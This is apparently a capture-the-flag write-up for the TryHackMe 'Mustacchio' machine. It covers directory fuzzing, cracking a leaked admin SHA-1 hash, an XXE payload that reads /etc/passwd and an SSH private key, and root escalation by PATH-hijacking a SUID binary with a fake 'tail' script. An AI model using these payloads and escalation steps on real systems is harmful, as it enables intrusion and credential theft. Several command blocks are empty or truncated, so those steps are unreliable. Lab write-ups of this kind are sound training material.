The Mustacchio machine on TryHackMe is an easy-difficulty challenge that requires a blend of web exploitation, cryptographic cracking, and Linux privilege escalation techniques. The journey begins with fuzzing found webs on port scanning to discover hidden directories and endpoints, which lead to crucial data for cracking password hashes. With the cracked credentials in hand, the next step is to exploit an XXE (XML External Entity) vulnerability to retrieve an SSH key pair, providing the initial foothold on the machine.

From there, privilege escalation is achieved by leveraging a binary with the SUID bit set. By analyzing the SUID binary strings, we discover that a known binary is called without using an absolute path. This allows us to hijack the execution by placing our own version of the binary earlier in the PATH, gaining root privileges and full system control.

## Initial foothold

Port 80 presents a standard webpage that, at first glance and after navigating around, appears unremarkable with no immediately visible vulnerabilities.

![web](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image.png)

I proceeded by using ffuf to perform content discovery, fuzzing the website to uncover hidden directories and files that might reveal more entry points.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]

I discovered a custom entry point that features a directory listing. Within the `js` folder, I found an intriguing file named users.bak

![dirlisting1](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-1.png)

![dirlisting2](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-2.png)


I downloaded the file and checked its format, confirming it to be a SQLite3 database. Inside, I discovered a users table, and upon outputting its contents, I found an entry for the user 'admin,' which included a password hash.

```bash

```

The hash appeared to be a SHA-1, so I proceeded to crack the found password hash using Hashcat. After running the cracking process, password is successfully retrieved

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# echo "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b" > admin_hash

```

I attempted to log in via SSH using the admin user and the cracked password, but the login was unsuccessful

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# ssh admin@10.10.23.241

Warning: Permanently added '10.10.23.241' (ED25519) to the list of known hosts.

```

I decided to continue my investigation by exploring a different entry point on port 8765.
There I was presented with an admin panel that prompts for credentials.

![adminpanel](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-3.png)

Eentered the previously found credentials, and the login was successful!

![adminpanel2](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-4.png)

There is a textarea with a submit button on the panel, so I launched Burp Suite to intercept the request and analyze the data sent and received
Found an `/auth/dontforget.bak` endpoint and observed a response suggesting that an individual named `Barry` is able to log in using an SSH key.

![burp1](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-5.png)

In the web rendering preview, I encountered a section labeled 'Comment Preview.

![burp2](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-6.png)

I proceeded to download auth/dontforget.bak and checked its file format, confirming that it is an XML file. I then output the content for further analysis.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# wget http://10.10.23.241:8765/auth/dontforget.bak

  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I couldâ€™ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You couldâ€™ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>

Sent the found XML as an xml parameter in the previous request, and observed that it was reflected in the response.

![xxe](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-7.png)

This suggests that might vulnerable to XXE. So I executed a basic XXE payload using the previous XML to retrieve the contents of the /etc/passwd file

```text
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">] >
<comment>
	<name>A</name>
	<author>B</author>
	<com>&xxe;</com>
</comment>
```

The exploitation was successful, and can retrieve the contents of the /etc/passwd file.

![xxe2](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-8.png)

With that, XXE vulnerability is confirmed and discovered the users joe and barry. Given the earlier hint that barry can log in using SSH, so decided to attempt to retrieve the SSH key pair using XXE.

![xxe3](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-9.png)

Retrieved the private key, but it was encrypted. I copied it to a file named id_rsa and used John the Ripper to format it correctly and attempt to crack the hash

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# /usr/share/john/ssh2john.py id_rsa > barry.hash

Successfully cracked the key, set the correct permissions for the SSH key, and attempted to log in using it in an SSH connection. However, we were prompted for a passphrase, so entered the cracked password
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# chmod 600 barry

```

Success! Foothold obtained on the machine and can grab user flag, now itâ€™s time to proceed with privilege escalation.

## Privilege escalation

We began by checking for SUID files on the system for current user

```bash
barry@mustacchio:~$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap

/home/joe/live_log     <--------------------------
/bin/ping                         
/bin/ping6                         
/bin/umount
/bin/mount
/bin/fusermount
/bin/su

barry@mustacchio:~$ ls -latr /home/joe/live_log                                                                             
-rwsr-xr-x 1 root root 16832 Jun 12  2021 /home/joe/live_log
```

Found an interesting SUID file that barry can execute, located at `/home/joe/live_log`

By extracting strings from the file, we discovered that it runs the tail command on `/var/log/nginx/access.log`

![strings](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-10.png)

The problem relies in that tail might be exploited because it is run without an absolute path, making it exploitable. To take advantage of this, we can create a malicious tail script in the /tmp directory that is crafted to create a copy of bash in /tmp/bash and set the SUID bit on it, /tmp can be added to the beginning of the $PATH, and then run the SUID file to escalate privileges.
After this script is executed with elevated privileges, we can use the modified bash shell to spawn a root shell.

```bash
barry@mustacchio:~$ cd /tmp
barry@mustacchio:/tmp$ vim tail 
barry@mustacchio:/tmp$ cat tail 
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
barry@mustacchio:/tmp$ chmod +x /tmp/tail 
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ /home/joe/live_log 
Live Nginx Log Readerbarry
```

The bash copy in /tmp was created with the SUID bit set, owned by root, and is executable by any user. This enables us to run /tmp/bash as root, giving us a root shell

![bashcreated](../assets/img/posts/2024-11-02-post-thm-writeup-mustacchio/image-11.png)

```bash
barry@mustacchio:/tmp$ /tmp/bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt 
3******************************5
```

With this final step, we successfully obtained the root flag. The privilege escalation was completed, granting us full control over the system
